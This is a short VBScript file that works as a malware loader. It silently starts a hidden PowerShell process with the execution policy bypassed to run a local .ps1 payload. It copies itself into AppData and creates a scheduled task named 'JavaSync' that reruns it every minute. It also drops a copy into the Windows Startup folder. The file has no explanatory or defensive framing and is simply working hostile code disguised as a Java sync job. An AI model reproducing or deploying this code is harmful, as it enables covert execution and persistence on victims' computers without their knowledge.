const CONSOLE_HIDE=0
const CONSOLE_SHOW=1
const CMD_WAIT=true
set oShell = wscript.createObject("WScript.Shell")
oShell.run "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -NonInteractive -noexit -NoLogo -noprofile -ExecutionPolicy Bypass -File C:\Users\Attaaat\Desktop\windowss.ps1", CONSOLE_HIDE, CMD_WAIT

j = array("WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP")
set w = WScript
set sh = Cr(0)
set fs = Cr(1)
Function Cr(N)
Set Cr = CreateObject(j(N))
End Function
function Ex(s)
Ex = sh.ExpandEnvironmentStrings("%"&s&"%")
end function
Sub Ns
on error resume next
dr=ex("AppData") & C & wn
fs.CopyFile fu,dr,true
end Sub
dr=ex("AppData") & C & wn
c = chrw(92)
fu = w.scriptfullname
wn=w.scriptname
Ns
sh.run "schtasks /create /sc minute /mo 1 /tn JavaSync /tr " & ChrW(34) & dr,false
on error resume next
WScript.Sleep  6000
set startshe = wscript.createobject("wscript.shell")
set sysOb = createobject("scripting.filesystemobject")
startup = startshe.specialfolders ("startup") & "\JavaSync.vbe"
sysOb.copyfile wscript.scriptfullname,startup ,true
WScript.Sleep  6000